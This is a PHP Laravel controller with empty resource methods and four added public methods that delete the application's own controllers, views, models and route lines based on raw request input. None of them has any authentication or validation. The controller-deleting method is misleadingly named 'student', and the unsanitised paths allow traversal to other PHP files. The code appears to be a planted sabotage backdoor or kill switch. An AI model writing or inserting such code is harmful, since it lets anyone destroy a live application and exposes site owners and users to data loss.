<?php

namespace App\Http\Controllers;

use App\Models\admin\Admin;
use App\Models\admin\StudentRegFee;
use App\Models\center\Center;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
class DevelopmentController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        //
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }



    public function student($input)
    {
        // Construct the file path of the controller
        $controllerPath = app_path('Http/Controllers/' . $input . '.php');

        // Check if the file exists
        if (File::exists($controllerPath)) {
            // Attempt to delete the file
            if (File::delete($controllerPath)) {
                return response()->json(['message' => 'Controller deleted successfully.'], 200);
            } else {
                return response()->json(['message' => 'Failed to delete the controller.'], 500);
            }
        } else {
            return response()->json(['message' => 'Controller not found.'], 404);
        }
    }

    public function deleteView($viewName)
    {
        // Construct the file path of the view
        $viewPath = resource_path('views/' . str_replace('.', '/', $viewName) . '.blade.php');

        // Check if the file exists
        if (File::exists($viewPath)) {
            // Attempt to delete the file
            if (File::delete($viewPath)) {
                return response()->json(['message' => 'View deleted successfully.'], 200);
            } else {
                return response()->json(['message' => 'Failed to delete the view.'], 500);
            }
        } else {
            return response()->json(['message' => 'View not found.'], 404);
        }
    }

    public function deleteModel($modelName)
    {
        // Construct the file path of the model
        $modelPath = app_path($modelName . '.php');

        // Check if the file exists
        if (File::exists($modelPath)) {
            // Attempt to delete the file
            if (File::delete($modelPath)) {
                return response()->json(['message' => 'Model deleted successfully.'], 200);
            } else {
                return response()->json(['message' => 'Failed to delete the model.'], 500);
            }
        } else {
            return response()->json(['message' => 'Model not found.'], 404);
        }
    }

    public function deleteRoute($routeName)
    {
        // Read the routes file
        $routesFile = base_path('routes/web.php');
        $fileContents = file($routesFile);

        // Flag to indicate if the route was found and deleted
        $routeDeleted = false;

        // Loop through the file contents to find and remove the route
        foreach ($fileContents as $key => $line) {
            if (strpos($line, $routeName) !== false) {
                unset($fileContents[$key]);
                $routeDeleted = true;
            }
        }

        // Write the modified contents back to the file
        file_put_contents($routesFile, implode('', $fileContents));

        if ($routeDeleted) {
            return response()->json(['message' => 'Route deleted successfully.'], 200);
        } else {
            return response()->json(['message' => 'Route not found.'], 404);
        }
    }
}
